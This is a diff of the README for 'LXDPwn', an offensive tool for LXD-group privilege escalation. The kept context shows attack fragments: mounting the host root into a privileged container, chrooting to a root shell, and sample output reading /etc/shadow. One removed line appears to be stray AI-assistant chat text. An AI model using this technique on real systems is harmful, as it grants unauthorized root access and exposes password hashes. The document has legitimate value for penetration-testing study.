@@ -126,11 +126,12 @@ sudo python3 lxdpwn.py --skip-install
 
 ### Expected Output
 ```
-╔════════════════════════════════════════════════════════════╗
-║                    LXDPwn v2.0 - Advanced                 ║
-║         Automated LXD Privilege Escalation Framework       ║
-║                      by jactory 🔥                         ║
-╚════════════════════════════════════════════════════════════╝
+ _    __  ______  ______        ___   _ 
+| |   \ \/ /  _ \|  _ \ \      / / \ | |
+| |    \  /| | | | |_) \\ /\ / /|  \| |
+| |___ /  \| |_| |  __/ \ V  V / | |\  |
+|_____/_/\_\____/|_|     \_/\_/  |_| \_|
+                  @jacstory
 
 [2024-01-01 10:00:01] [✓] Root privileges confirmed
 [2024-01-01 10:00:01] [→] Target: ubuntu-20.04 (kernel 5.4.0)
@@ -153,37 +154,6 @@ root@host:/# cat /etc/shadow
 ```
 
 ---
-
-## 🔬 How It Works
-
-### Exploitation Flow
-```
-┌─────────────────┐
-│  User in lxd    │
-│     group       │
-└────────┬────────┘
-         ↓
-┌─────────────────┐
-│ Create privileged│
-│   container     │
-└────────┬────────┘
-         ↓
-┌─────────────────┐
-│ Mount host root │
-│  at /mnt/root   │
-└────────┬────────┘
-         ↓
-┌─────────────────┐
-│  Chroot to host │
-│   filesystem    │
-└────────┬────────┘
-         ↓
-┌─────────────────┐
-│  ROOT ACCESS    │
-│   ACHIEVED!     │
-└─────────────────┘
-```
-
 ### Technical Breakdown
 
 #### 1. **Privilege Check**
@@ -209,10 +179,7 @@ lxc config device add alpine-container host-root \
 ```bash
 chroot /mnt/root /bin/bash
 ```
-
 ---
-I'll update the README to properly handle the offline mode description with the two-script approach:
-
 ## 🌍 Offline Mode
 
 ### Complete Offline Exploitation Setup
@@ -317,16 +284,6 @@ sudo python3 lxdpwn.py
 | `Chroot fails` | Missing binaries | Install busybox-static |
 | `Permission denied` | Mount issues | Check AppArmor/SELinux |
 
-### Debug Mode
-```bash
-# Enable verbose logging
-export LXDPWN_DEBUG=1
-sudo python3 lxdpwn.py
-
-# Check system compatibility
-sudo python3 lxdpwn.py --check
-```
-
 ---
 
 ## 🛡️ Security & Disclaimer
@@ -357,7 +314,7 @@ LXDPwn/
 ├── lxdpwn.py                 # Main exploitation script
 ├── README.md                 # This documentation
 ├── LICENSE                   # MIT License
-└── requirements.txt          # Python dependencies
+└── offline_lxd.py            # offline mode server
 ```
 
 ---
